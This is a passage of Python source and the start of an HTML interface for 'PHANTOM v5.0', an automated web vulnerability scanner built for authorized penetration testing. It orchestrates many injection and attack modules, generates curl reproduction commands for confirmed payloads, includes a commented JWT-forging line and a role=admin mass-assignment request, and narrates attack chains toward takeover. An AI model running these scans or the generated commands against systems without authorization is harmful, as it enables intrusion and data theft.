    INJ = {"SQL Injection", "Reflected XSS", "LFI", "SSRF", "Command Injection",
           "NoSQL Injection", "SSTI", "Expression Language Injection", "XPath Injection",
           "LDAP Injection", "Open Redirect", "CRLF Injection", "Hidden Parameter"}
    made = 0
    with job._lock:
        for v in job.vulns:
            t = v["type"]; loc = v["location"]; p = v.get("parameter", ""); pl = v.get("payload", "")
            poc = ""
            if t in INJ and p and pl:
                sep = "&" if "?" in loc else "?"
                poc = (f"# Reproduce ({t}) — payload was confirmed by the scanner\n"
                       f"curl -G '{loc}' --data-urlencode '{p}={pl}'\n"
                       f"# Expected: the response shows the injection effect noted in evidence.")
            elif t in ("Out-of-Band RCE", "Blind SSRF (OOB)", "Blind XXE (OOB)"):
                poc = (f"# {t} — confirmed via out-of-band call-back to the scanner's listener.\n"
                       f"# The target fetched our unique OOB URL, proving server-side execution/fetch.")
            elif t in ("Missing Header (HIGH)", "Missing Header (MEDIUM)", "Clickjacking",
                       "CORS Misconfiguration", "Insecure Cookie"):
                poc = (f"# Verify ({t}) — inspect the response headers:\n"
                       f"curl -sI '{loc}'")
            elif t in ("Weak JWT Secret",):
                poc = ("# Forge a token once the HMAC secret is known (see evidence):\n"
                       "# python: jwt.encode({'user':'admin','role':'admin'}, '<secret>', algorithm='HS256')")
            elif t in ("Backup File Exposed", "Source Code Disclosure", "Sensitive File Exposed",
                       "Directory Listing", "Forced Browsing"):
                poc = f"# Fetch the exposed resource:\ncurl -s '{loc}'"
            elif t in ("Mass Assignment",):
                poc = (f"# Send protected fields in the body:\n"
                       f"curl -s '{loc}' -H 'Content-Type: application/json' "
                       f"-d '{{\"role\":\"admin\",\"is_admin\":true}}'")
            else:
                poc = f"# Verify ({t}):\ncurl -s '{loc}'"
            if cves and t in ("Outdated Service CVE", "WordPress Vulnerability",
                              "Drupal Vulnerability", "Log4Shell (JNDI)", "Out-of-Band RCE"):
                poc += f"\n# Related CVE references: {', '.join(cves[:4])}"
            v["poc"] = poc
            made += 1
    job.log(f"Exploit/PoC engine: {made} reproduction PoC(s) generated"
            + (f" | CVE refs: {', '.join(cves[:4])}" if cves else ""), "OK")


# ══ PHASE 3 ORCHESTRATOR ═════════════════════════════════════════════════════
def phase_vulns(job):
    # Speed: collapse identical URL templates so we don't re-test the same shape
    all_urls = _dedup_urls(list(job.urls) or [job.url])[:MAX_VULN_URLS]
    total    = len(all_urls) * 10 + 12 + 14 + 7 + 4
    job.set_phase("Phase 3: Vulns & Exploits", total)
    job.log(f"Testing {len(all_urls)} unique URL shapes with 58 modules (FAST={FAST})...", "INFO")

    # Out-of-band payloads planted first so call-backs have the whole scan to arrive
    try:
        mod_oob_inject(job)
    except Exception as e:
        job.log(f"mod_oob_inject error: {str(e)[:60]}", "WARN")
    job.advance("Phase 3: Vulns & Exploits", 4)

    # Per-URL tests (parallelized)
    def scan_url(url):
        if job.over_budget():
            return
        mod_sqli(job, url)
        mod_xss(job, url)
        mod_lfi(job, url)
        mod_ssrf(job, url)
        mod_cmdi(job, url)
        mod_idor(job, url)
        mod_redirect(job, url)
        mod_hpp(job, url)
        mod_business_logic(job, url)
        mod_cache_poison(job, url)
        mod_secrets_scan(job, url)
        mod_nosqli(job, url)
        mod_crlf(job, url)
        mod_ssti_advanced(job, url)
        mod_el_injection(job, url)
        mod_xpath_ldap(job, url)
        mod_param_mining(job, url)
        mod_verbose_errors(job, url)
        mod_adaptive_fuzz(job, url)
        job.advance("Phase 3: Vulns & Exploits", 10)

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futs = [ex.submit(scan_url, u) for u in all_urls]
        for fut in as_completed(futs):
            try:
                fut.result()
            except:
                pass

    # Form-based tests
    mod_sqli_forms(job)
    mod_xss_forms(job)
    job.advance("Phase 3: Vulns & Exploits", 2)

    # Site-wide tests (run once)
    mod_xxe(job, job.url)
    job.advance("Phase 3: Vulns & Exploits")
    mod_request_smuggling(job, job.url)
    job.advance("Phase 3: Vulns & Exploits")
    mod_graphql(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_oauth(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_cms_deep(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_rate_limit(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_csp(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_cors(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_headers(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_cookies(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_files(job)
    job.advance("Phase 3: Vulns & Exploits")
    mod_fingerprint(job)
    job.advance("Phase 3: Vulns & Exploits")

    # ── Extended site-wide modules ────────────────────────────────────────────
    for m in (mod_host_header, mod_subdomain_takeover, mod_dom_xss,
              mod_deserialization, mod_http_methods, mod_dir_listing,
              mod_mixed_content, mod_email_security, mod_cloud_storage,
              mod_log4shell, mod_tabnabbing, mod_cache_control,
              mod_websocket, mod_well_known,
              # round-2 site-wide
              mod_stored_xss, mod_user_enum, mod_file_upload, mod_backup_files,
              mod_web_cache_deception, mod_jwt_attacks, mod_forced_browse,
              # round-3 advanced engines
              mod_stateful_logic, mod_api_fuzz,
              # round-4 code-level & reverse engineering
              mod_code_audit, mod_reverse_engineer):
        if job.over_budget():
            job.log("Time budget reached — wrapping up remaining site-wide modules", "WARN")
            break
        try:
            m(job)
        except Exception as e:
            job.log(f"{m.__name__} error: {str(e)[:60]}", "WARN")
        job.advance("Phase 3: Vulns & Exploits")


# ══ MAIN SCAN RUNNER ══════════════════════════════════════════════════════════
# == HYPOTHESIS ENGINE (heuristic, no API) ====================================
# Looks at recon signals (tech stack, ports, headers, forms, params) and
# predicts which vulnerability classes are most likely, so the scan is guided
# by reasoning instead of blindly firing every payload.
def phase_hypothesis(job):
    job.log("Hypothesis engine: analyzing recon signals...", "INFO")
    hyps = []
    tech  = [t.lower() for t in job.tech_stack]
    ports = [p["port"] for p in job.ports]
    has_forms  = len(job.forms) > 0
    has_params = any("?" in u and "=" in u for u in job.urls)
    waf        = job.waf_info.get("waf")

    # Tech-stack driven hypotheses
    if any("wordpress" in t for t in tech):
        hyps.append(("HIGH", "WordPress -> wp-json user enumeration, xmlrpc brute-force amplification, outdated plugin CVEs"))
    if any("drupal" in t for t in tech):
        hyps.append(("HIGH", "Drupal -> check CHANGELOG version against Drupalgeddon CVEs"))
    if any("joomla" in t for t in tech):
        hyps.append(("MEDIUM", "Joomla -> configuration.php backup leak, admin panel exposure"))
    if any("php" in t for t in tech):
        hyps.append(("HIGH", "PHP stack -> LFI via php://filter, SQLi through mysqli, type-juggling auth bypass"))
    if any(x in t for t in tech for x in ("express", "node")):
        hyps.append(("MEDIUM", "Node/Express -> prototype pollution, NoSQL injection, SSRF in URL params"))
    if any("flask" in t or "werkzeug" in t for t in tech):
        hyps.append(("MEDIUM", "Flask/Werkzeug -> SSTI (Jinja2), debug console exposure"))
    if any("django" in t for t in tech):
        hyps.append(("LOW", "Django -> debug mode info leak, weak SECRET_KEY signing"))

    # Port driven hypotheses
    for p in ports:
        if p in (6379, 9200, 27017, 11211):
            hyps.append(("CRITICAL", f"Port {p} open -> unauthenticated datastore access likely (data exfiltration)"))
        if p in (21, 23):
            hyps.append(("HIGH", f"Port {p} open -> legacy plaintext service, anonymous/default creds worth testing"))
        if p in (3306, 5432, 1433):
            hyps.append(("MEDIUM", f"Port {p} open -> database directly exposed to the internet"))

    # Surface driven hypotheses
    if has_params:
        hyps.append(("HIGH", "URL parameters present -> reflected XSS, SQLi, IDOR, open redirect candidates"))
    if has_forms:
        hyps.append(("HIGH", "Forms present -> CSRF token absence, stored XSS, SQLi in POST body"))
    if waf:
        hyps.append(("MEDIUM", f"{waf} detected -> payloads need encoding/case-mutation; test HTTP parameter pollution bypass"))

    # Rank: CRITICAL > HIGH > MEDIUM > LOW
    order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    hyps.sort(key=lambda h: order.get(h[0], 4))

    if not hyps:
        job.log("Hypothesis engine: low signal, running full baseline scan", "INFO")
    for sev, text in hyps[:12]:
        job.log(f"HYPOTHESIS [{sev}]: {text}", "WARN")
    job.log(f"Hypothesis engine: {len(hyps)} prioritized leads generated", "OK")


# == VERIFICATION LAYER (Test & Verify) =======================================
# Assigns a confidence score to every finding from the strength of its
# evidence, flags weak/blind findings for manual review, and drops dead noise.
# This is false-positive reduction -- a hallmark of professional scanners.
def verify_findings(job):
    job.log("Verification: scoring findings and filtering false positives...", "INFO")
    STRONG = ["root:x:", "sql error", "you have an error in your sql",
              "ami-id", "instance-id", "redis_version", "230 ", "__schema",
              "drupal", "wordpress", "JFactory", "1787569", "cracked",
              "stack trace", "alg:none", "un-encoded", "source code/config"]
    BLIND  = ["time-based", "delayed", "possible", "candidate", "may be",
              "blind", "timeout"]
    confirmed = manual = 0
    with job._lock:
        for v in job.vulns:
            ev   = (v.get("evidence") or "").lower()
            ext  = v.get("extracted") or {}
            conf = 60  # baseline

            # Direct observable findings (headers, cookies, info leaks) are deterministic
            if v["type"] in ("Missing Header", "Insecure Cookie", "Info Disclosure",
                              "CSP Weakness", "Clickjacking", "CORS Misconfiguration"):
                conf = 95
            # Hard proof in evidence
            if any(s.lower() in ev for s in STRONG):
                conf = max(conf, 96)
            # Extracted data present (e.g. db version, usernames) = very strong
            if ext and any(k not in ("confidence", "status") for k in ext):
                conf = max(conf, 92)
            # We pinpointed the exact vulnerable code line => high confidence
            if v.get("code"):
                conf = max(conf, 90)
            # Blind / timing findings need a human
            if any(b in ev for b in BLIND):
                conf = min(conf, 65)

            status = "confirmed" if conf >= 85 else "needs manual review"
            if status == "confirmed":
                confirmed += 1
            else:
                manual += 1
            ext["confidence"] = f"{conf}%"
            ext["status"]     = status
            v["extracted"]    = ext

    job.log(f"Verification: {confirmed} confirmed, {manual} need manual review", "OK")


# == ATTACK-CHAIN ANALYZER (Chain Attacks) ====================================
# Correlates findings that already exist and narrates the combined attack path
# plus the escalated business risk. It describes how issues compound -- it does
# NOT generate any working exploit code.
def analyze_attack_chains(job):
    job.log("Chain analysis: correlating findings into attack paths...", "INFO")
    types = {v["type"] for v in job.vulns}
    ports = {p["port"] for p in job.ports}
    has_secret = len(job.secrets) > 0 or "API Key Exposed" in types
    n_before   = len(job.chains)

    def has_any(*names):
        return any(n in types for n in names)

    # File read -> credentials -> data
    if has_any("LFI", "LFI Config Read", "Sensitive File Exposed") and has_secret:
        job.chain("ATTACK PATH: file disclosure -> read config/.env -> DB & API credentials -> full data access")
    # SQLi -> dump -> admin
    if has_any("SQL Injection", "SQL Injection (Form)") and has_any("Admin Panel Found"):
        job.chain("ATTACK PATH: SQL injection -> dump credential table -> reuse on exposed admin panel -> full control")
    elif has_any("SQL Injection", "SQL Injection (Form)"):
        job.chain("ATTACK PATH: SQL injection -> database read/modify -> potential credential theft")
    # Exposed datastore
    if {6379, 9200, 27017, 11211} & ports or has_any("Unauthenticated Redis",
        "Unauthenticated Elasticsearch", "Unauthenticated MongoDB"):
        job.chain("ATTACK PATH: open datastore -> bulk data exfiltration; writable keys enable cache/session poisoning")
    # SSRF -> internal pivot
    if has_any("SSRF") and (ports - {80, 443}):
        job.chain("ATTACK PATH: SSRF -> reach internal-only services -> cloud metadata / admin endpoints")
    elif has_any("SSRF"):
        job.chain("ATTACK PATH: SSRF -> request internal resources and cloud metadata")
    # Cloud key leak
    if has_any("API Key Exposed"):
        job.chain("ATTACK PATH: leaked key -> authenticate to third-party/cloud service -> account or infra takeover")
    # XSS + CSRF
    if has_any("Reflected XSS", "Reflected XSS (Form)", "SSTI") and has_any("CSRF Missing Token"):
        job.chain("ATTACK PATH: XSS -> steal session/CSRF token -> perform authenticated actions as victim")
    # Open redirect + OAuth
    if has_any("Open Redirect") and has_any("OAuth Misconfiguration"):
        job.chain("ATTACK PATH: open redirect -> hijack OAuth redirect_uri -> steal authorization code -> account takeover")
    # Command injection -> RCE
    if has_any("Command Injection"):
        job.chain("ATTACK PATH: command injection -> arbitrary OS commands -> remote code execution / lateral movement")
    # XXE
    if has_any("XXE Injection"):
        job.chain("ATTACK PATH: XXE -> read server files and perform SSRF via external entities")
    # Broad attack surface
    if len(job.subdomains) >= 5:
        job.chain(f"ATTACK PATH: {len(job.subdomains)} subdomains widen the surface -> weakest host becomes the entry point")

    # ── Extended correlations (round 2) ───────────────────────────────────────
    # Template / EL injection -> RCE
    if has_any("SSTI", "Expression Language Injection"):
        job.chain("ATTACK PATH: template/EL injection -> expression evaluation -> remote code execution on the server")
    # Backup/source disclosure -> secrets -> deeper access
    if has_any("Backup File Exposed", "Source Code Disclosure"):
        job.chain("ATTACK PATH: backup/source disclosure -> read logic & embedded secrets -> craft precise exploits / DB access")
    # Forced browsing / admin exposure -> default creds
    if has_any("Forced Browsing", "Admin Panel Found") and has_any("Default Credentials"):
        job.chain("ATTACK PATH: exposed admin panel + default credentials -> direct administrative takeover")
    elif has_any("Forced Browsing"):
        job.chain("ATTACK PATH: access-control bypass -> reach admin/internal functions without authentication")
    # JWT forge -> privilege escalation
    if has_any("Weak JWT Secret"):
        job.chain("ATTACK PATH: cracked/none JWT secret -> forge a token with role=admin -> full account & data takeover")
    # File upload -> shell -> RCE
    if has_any("Unrestricted File Upload"):
        job.chain("ATTACK PATH: unrestricted upload -> drop a web shell -> remote code execution & persistence")
    # User enumeration + missing rate limit -> credential stuffing
    if has_any("User Enumeration") and has_any("Rate Limiting Missing"):
        job.chain("ATTACK PATH: username enumeration + no rate limiting -> high-speed credential brute-force / stuffing")
    # Host header / CRLF -> cache poisoning amplification
    if has_any("Host Header Injection", "CRLF Injection") and has_any("Web Cache Poisoning", "Web Cache Deception"):
        job.chain("ATTACK PATH: header/CRLF injection -> poison shared cache -> malicious response served to all users")
    # Stored XSS -> account takeover (worm-able)
    if has_any("Stored XSS"):
        job.chain("ATTACK PATH: stored XSS -> hijack sessions of every visitor incl. admins -> self-propagating account takeover")
    # Subdomain takeover -> cookie/oauth abuse
    if has_any("Subdomain Takeover"):
        job.chain("ATTACK PATH: subdomain takeover -> host malicious content on a trusted domain -> steal scoped cookies / bypass OAuth origin checks")
    # Deserialization / Log4Shell -> RCE
    if has_any("Insecure Deserialization", "Log4Shell (JNDI)"):
        job.chain("ATTACK PATH: deserialization/JNDI gadget -> remote code execution -> full server compromise")
    # NoSQL / XPath / LDAP injection -> auth bypass
    if has_any("NoSQL Injection", "XPath Injection", "LDAP Injection"):
        job.chain("ATTACK PATH: NoSQL/XPath/LDAP injection -> authentication bypass and backend data extraction")
    # Verbose errors feed everything else
    if has_any("Verbose Error Disclosure") and len(types) > 3:
        job.chain("ATTACK PATH: verbose errors reveal stack/paths -> attacker fine-tunes the other findings into reliable exploits")

    added = len(job.chains) - n_before
    if added == 0:
        job.log("Chain analysis: no multi-step chains -- findings are isolated", "INFO")
    else:
        job.log(f"Chain analysis: {added} attack path(s) identified", "OK")


# == MAIN SCAN RUNNER =========================================================
def run_scan(job):
    try:
        phase_osint(job)
        phase_ports(job)
        phase_spider(job)
        try:
            mod_headless_dom(job)          # dynamic DOM / SPA enrichment (best-effort)
        except Exception as e:
            job.log(f"headless dom error: {str(e)[:50]}", "WARN")
        phase_hypothesis(job)
        phase_vulns(job)
        verify_findings(job)
        analyze_attack_chains(job)
        generate_poc(job)               # Generate Exploits / reproduction PoC
        # OOB settle window — give planted call-backs a moment to land
        if OOB_BASE and not oob_hits(job.oob_token):
            for _ in range(6):
                if oob_hits(job.oob_token):
                    break
                time.sleep(1)
        oob_collect(job)
        # Surface what the RL mutator learned about this target
        top = job.mutator.ranking()[:3]
        if any(n for _, _, n in top):
            job.log("RL mutator top strategies: " +
                    ", ".join(f"{s}(Q={q})" for s, q, n in top if n), "OK")
    except Exception as e:
        job.log(f"Scanner error: {e}", "WARN")
    finally:
        job.done()
        cnt = len(job.vulns)
        job.log(f"PHANTOM COMPLETE — {cnt} issue{'s' if cnt!=1 else ''} | {job.elapsed}s", "OK")


HOME_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>PHANTOM v5.0 — Ultimate Web Scanner</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#080c10;--bg2:#0d1117;--bg3:#161b22;--bd:#21262d;
  --red:#f85149;--yr:#d29922;--cy:#58a6ff;--gn:#3fb950;--mg:#bc8cff;
  --tx:#e6edf3;--dm:#8b949e}
body{font-family:'Segoe UI',system-ui,monospace;background:var(--bg);color:var(--tx);min-height:100vh}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:#30363d;border-radius:2px}
.hdr{background:linear-gradient(180deg,#0a0a0a,var(--bg2));border-bottom:1px solid #f8514930;
  padding:12px 22px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.hdr-art{font-family:monospace;font-size:.5rem;line-height:1.1;color:var(--red);flex-shrink:0}
.hdr-txt h1{font-size:1rem;color:var(--red);font-weight:700;letter-spacing:.05em}
.hdr-txt p{font-size:.68rem;color:var(--dm);margin-top:2px}
.bdg{display:inline-block;padding:2px 7px;border-radius:3px;font-size:.62rem;font-weight:700;margin-left:6px}
.br{background:#f8514918;border:1px solid #f8514940;color:var(--red)}
.bc{background:#388bfd15;border:1px solid #388bfd40;color:var(--cy)}
.bg{background:#3fb95015;border:1px solid #3fb95040;color:var(--gn)}
.bm{background:#bc8cff18;border:1px solid #bc8cff40;color:var(--mg)}
.byr{background:#d2992218;border:1px solid #d2992240;color:var(--yr)}
.wrap{max-width:1080px;margin:0 auto;padding:16px 12px}
.alert{background:#d2992215;border:1px solid #d2992240;border-radius:8px;
  padding:8px 14px;margin-bottom:12px;color:var(--yr);font-size:.77rem}
.card{background:var(--bg3);border:1px solid var(--bd);border-radius:12px;padding:20px;margin-bottom:12px}
.card h2{color:var(--tx);font-size:.92rem;margin-bottom:3px}
.card p{color:var(--dm);font-size:.77rem;margin-bottom:14px}
label{display:block;color:var(--dm);font-size:.72rem;margin-bottom:4px}
input[type=text]{width:100%;background:var(--bg);border:1px solid #30363d;border-radius:8px;
  padding:9px 12px;color:var(--tx);font-size:.88rem;outline:none;transition:border-color .2s;font-family:monospace}
input[type=text]:focus{border-color:var(--cy)}
.btn{background:linear-gradient(135deg,#7f1d1d,#dc2626);border:none;color:#fff;
  padding:11px 20px;border-radius:8px;cursor:pointer;font-size:.88rem;font-weight:700;
  width:100%;margin-top:6px;letter-spacing:.04em;transition:opacity .2s}
.btn:hover{opacity:.88}.btn:disabled{opacity:.4;cursor:not-allowed}
.qt a{color:var(--cy);font-size:.73rem;display:inline-block;margin:3px 5px 3px 0;text-decoration:none}
.qt a:hover{text-decoration:underline}
#pa{display:none;margin-bottom:12px}
.pc{background:var(--bg3);border:1px solid var(--bd);border-radius:12px;padding:14px 18px;margin-bottom:10px}
.ptop{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.pl{color:var(--tx);font-size:.86rem;font-weight:600}.pp{color:var(--cy);font-size:1rem;font-weight:700}
.ptr{background:#21262d;border-radius:99px;height:6px;overflow:hidden}
.pb{background:linear-gradient(90deg,var(--red),var(--mg),var(--cy));height:100%;
  border-radius:99px;transition:width .4s ease;width:0%}
.pm{color:var(--dm);font-size:.72rem;margin-top:5px}
.phases{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
@media(max-width:560px){.phases{grid-template-columns:1fr}}
.ph{background:var(--bg);border-radius:7px;padding:6px 10px;border:1px solid var(--bd)}
.ph-n{color:var(--dm);font-size:.68rem;margin-bottom:3px}
.ph-t{background:#21262d;border-radius:99px;height:3px}
.ph-b{height:100%;border-radius:99px;transition:width .4s;background:var(--cy)}
.term{background:#010409;border:1px solid var(--bd);border-radius:10px;padding:10px 12px;
  height:200px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.7rem;scroll-behavior:smooth}
.ll{padding:1px 0;display:flex;gap:7px;line-height:1.4}.lt{color:#30363d;flex-shrink:0}
.INFO{color:var(--dm)}.OK{color:var(--gn)}.VULN{color:var(--red);font-weight:700}
.WARN{color:var(--yr)}.CHAIN{color:var(--mg);font-weight:700}
.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
@media(max-width:600px){.info-grid{grid-template-columns:1fr}}
.icard{background:var(--bg3);border:1px solid var(--bd);border-radius:10px;padding:12px 16px}
.icard h3{font-size:.8rem;margin-bottom:8px;font-weight:600}
.waf-row{display:flex;flex-wrap:wrap;gap:8px;font-size:.76rem}
.wi{color:var(--dm)}.wv{color:var(--tx);margin-left:3px}
.tech-tag{display:inline-block;background:#3fb95018;border:1px solid #3fb95030;
  color:var(--gn);padding:2px 7px;border-radius:4px;font-size:.7rem;margin:2px}
.port-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:6px;margin-top:6px}
.pch{background:var(--bg);border-radius:7px;padding:6px 10px;border:1px solid var(--bd)}
.pch.d{border-color:#f8514940}.pn{color:var(--tx);font-weight:700;font-size:.85rem}.ps{color:var(--dm);font-size:.68rem}
.sub-list{max-height:100px;overflow-y:auto;margin-top:6px;font-size:.72rem}
.sub-item{color:var(--cy);padding:2px 0;border-bottom:1px solid #21262d}
.chain-list{max-height:120px;overflow-y:auto}
.chi{display:flex;gap:8px;margin-bottom:4px;font-size:.72rem}
.cts{color:var(--dm);flex-shrink:0}.cmg{color:var(--mg)}
#sv{display:none;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
.sc{background:var(--bg3);border-radius:10px;padding:10px 12px;text-align:center;border:1px solid var(--bd)}
.sn{font-size:1.4rem;font-weight:700;margin-bottom:1px}.sl{font-size:.66rem;color:var(--dm);font-weight:600}
.C .sn{color:var(--red)}.H .sn{color:var(--yr)}.M .sn{color:var(--cy)}.L .sn{color:var(--gn)}
#ra{display:none}
.rh{background:var(--bg3);border:1px solid var(--bd);border-radius:12px;
  padding:14px 18px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center}
.rc{font-size:1rem;font-weight:700;color:var(--tx)}.rs{color:var(--dm);font-size:.73rem;margin-top:2px}
.rb{padding:4px 12px;border-radius:20px;font-size:.78rem;font-weight:700}
.rC{background:#f8514920;color:var(--red);border:1px solid #f8514960}
.rH{background:#d2992218;color:var(--yr);border:1px solid #d2992260}
.rM{background:#388bfd15;color:var(--cy);border:1px solid #388bfd50}
.rL{background:#3fb95018;color:var(--gn);border:1px solid #3fb95060}
.vl{display:grid;gap:8px;margin-bottom:14px}
.vc{background:var(--bg3);border-radius:10px;padding:12px 14px;border:1px solid var(--bd);border-left:3px solid transparent}
.vc.sC{border-left-color:var(--red)}.vc.sH{border-left-color:var(--yr)}.vc.sM{border-left-color:var(--cy)}.vc.sL{border-left-color:var(--gn)}
.vh{display:flex;align-items:center;gap:7px;margin-bottom:4px;flex-wrap:wrap}
.vs{padding:2px 6px;border-radius:4px;font-size:.65rem;font-weight:700}
.vt{color:var(--tx);font-size:.84rem;font-weight:600}
.vcvs{color:var(--dm);font-size:.67rem;margin-left:auto}
.vcvec{color:#444c56;font-size:.62rem;font-family:monospace;margin-bottom:3px}
.vd{color:var(--dm);font-size:.73rem;font-family:monospace;margin-bottom:4px}
.vpay{color:#79c0ff;font-size:.7rem;font-family:monospace;margin-bottom:3px}
.vext{background:var(--bg);border-radius:5px;padding:6px 9px;color:var(--gn);
  font-size:.7rem;font-family:monospace;margin-bottom:4px;border:1px solid #30363d}
.vimp{color:var(--yr);font-size:.72rem;margin-bottom:4px}
.vcode{background:#0a0e14;border:1px solid #f8514940;border-left:3px solid var(--red);
  border-radius:5px;padding:6px 9px;margin-bottom:5px}
.vcl{display:block;color:var(--red);font-size:.6rem;font-weight:700;letter-spacing:.05em;margin-bottom:3px}
.vcode pre{color:#ffa198;font-size:.66rem;font-family:monospace;white-space:pre-wrap;word-break:break-all;margin:0}
.vpoc pre{color:var(--gn);font-size:.67rem;font-family:monospace;white-space:pre-wrap;word-break:break-all;margin:0}
.ftb{background:none;border:none;color:var(--cy);font-size:.7rem;cursor:pointer;padding:0;display:block;margin-top:4px}
.fd{display:none;background:var(--bg);border-radius:5px;padding:7px 9px;margin-top:5px;
  color:#79c0ff;font-size:.7rem;border:1px solid var(--bd)}
.fd ol{padding-left:13px}.fd li{margin-bottom:2px;color:var(--gn)}
.nv{text-align:center;padding:22px;background:var(--bg3);border:1px solid var(--bd);border-radius:12px;color:var(--gn);font-size:.88rem}
.csp-card{background:var(--bg3);border:1px solid var(--bd);border-radius:10px;padding:12px 16px;margin-bottom:12px}
.csp-card h3{color:var(--cy);font-size:.82rem;margin-bottom:8px}
.csp-issue{color:var(--yr);font-size:.73rem;padding:3px 0;border-bottom:1px solid #21262d}
.bna{background:var(--bg3);border:1px solid var(--bd);color:var(--tx);padding:7px 16px;
  border-radius:8px;cursor:pointer;font-size:.78rem;text-decoration:none;display:inline-block;margin-top:9px}
.dlb{background:var(--bg);border:1px solid var(--bd);color:var(--cy);padding:5px 12px;
  border-radius:8px;cursor:pointer;font-size:.74rem;float:right;text-decoration:none}
</style>
</head>
<body>
<div class="hdr">
  <pre class="hdr-art">██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝</pre>
  <div class="hdr-txt">
    <h1>PHANTOM<span class="bdg br">v5.0</span><span class="bdg bc">CVSS v3.1</span><span class="bdg bm">OOB ENGINE</span><span class="bdg bg">RL MUTATOR</span><span class="bdg byr">58 MODULES</span></h1>
    <p>Persistent Heuristic Attack &amp; Network Threat Observation Machine — Ultimate Edition</p>
    <p style="color:#f8514970;font-size:.65rem;margin-top:1px">⚠ For authorized penetration testing only — IT Act 2000, Section 66</p>
  </div>
</div>
<div class="wrap">
<div class="alert">⚠ Only scan systems you <strong>own</strong> or have <strong>explicit written authorization</strong> to test. Unauthorized scanning is illegal.</div>
<div id="fa">
  <div class="card">
    <h2>⚡ Launch Ultimate Security Scan</h2>
    <p>PHANTOM v5.0 runs autonomous phases: OSINT + Subdomain Enum → Async Port Scan → Deep Spider + Headless DOM → 58 Modules incl. Out-of-Band engine, RL adaptive mutation, stateful business-logic & API fuzzing, with CVSS v3.1 scoring and an attack-chain engine.</p>
    <div style="margin-bottom:10px">
      <label>Target URL</label>
      <input type="text" id="iu" value="http://testphp.vulnweb.com/" placeholder="https://your-authorized-target.com">
    </div>
    <button type="button" class="btn" id="sb" onclick="go()">⚡ LAUNCH PHANTOM v5.0</button>
    <div id="err-box" style="display:none;margin-top:10px;background:#f8514918;border:1px solid #f8514960;
      border-radius:8px;padding:10px 14px;color:#f85149;font-size:.8rem;font-family:monospace"></div>
    <div class="qt" style="margin-top:10px">
      <span style="color:var(--dm);font-size:.71rem">Legal practice targets: </span>
      <a href="#" onclick="su('http://testphp.vulnweb.com/')">testphp.vulnweb.com</a>
      <a href="#" onclick="su('http://demo.testfire.net/')">demo.testfire.net</a>
      <a href="#" onclick="su('http://testphp.vulnweb.com/listproducts.php?cat=1')">SQLi test</a>
      <a href="#" onclick="su('http://testphp.vulnweb.com/artists.php?artist=1')">artists.php</a>
    </div>
  </div>
</div>
<div id="pa">
  <div class="pc">
    <div class="ptop"><span class="pl" id="pl">Initializing PHANTOM...</span><span class="pp" id="pp">0%</span></div>
    <div class="ptr"><div class="pb" id="pb"></div></div>
    <div class="pm" id="pm">Starting...</div>
    <div class="phases" id="phg"></div>
  </div>
  <div class="term" id="tm"></div>
</div>
<div class="info-grid" id="info-grid" style="display:none">
  <div class="icard" id="waf-card" style="display:none">
    <h3 style="color:var(--yr)">🛡 WAF Detection</h3>
    <div class="waf-row" id="waf-row"></div>
  </div>
  <div class="icard" id="tech-card" style="display:none">
    <h3 style="color:var(--gn)">🔧 Tech Stack</h3>
    <div id="tech-tags"></div>
  </div>
  <div class="icard" id="port-card" style="display:none">
    <h3 style="color:var(--cy)">🔌 Open Ports</h3>
    <div class="port-grid" id="pg"></div>
  </div>
  <div class="icard" id="sub-card" style="display:none">
    <h3 style="color:var(--mg)">🌐 Subdomains Found</h3>
    <div class="sub-list" id="sub-list"></div>
  </div>
</div>
<div class="icard" id="chain-card" style="display:none;margin-bottom:12px">
  <h3 style="color:var(--mg)">⛓ Chain Engine Events</h3>
  <div class="chain-list" id="chain-list"></div>
</div>
<div id="sv" style="display:none">
  <div class="sc C"><div class="sn" id="sC">0</div><div class="sl">CRITICAL</div></div>
  <div class="sc H"><div class="sn" id="sH">0</div><div class="sl">HIGH</div></div>
  <div class="sc M"><div class="sn" id="sM">0</div><div class="sl">MEDIUM</div></div>
  <div class="sc L"><div class="sn" id="sL">0</div><div class="sl">LOW</div></div>
</div>
<div id="ra">
  <div class="rh">
    <div>
      <div class="rc" id="rc">—</div>
      <div class="rs" id="rs2"></div>
      <div class="rs" id="rs3"></div>
    </div>
    <div class="rb rL" id="rb">—</div>
  </div>
  <div class="csp-card" id="csp-card" style="display:none">
    <h3>🔒 CSP Analysis</h3>
    <div id="csp-issues"></div>
  </div>
  <div class="vl" id="vl"></div>
  <a href="/" class="bna">← New Scan</a>
  <a href="#" class="dlb" id="dl">⬇ Download JSON Report</a>
</div>
</div>
<script>
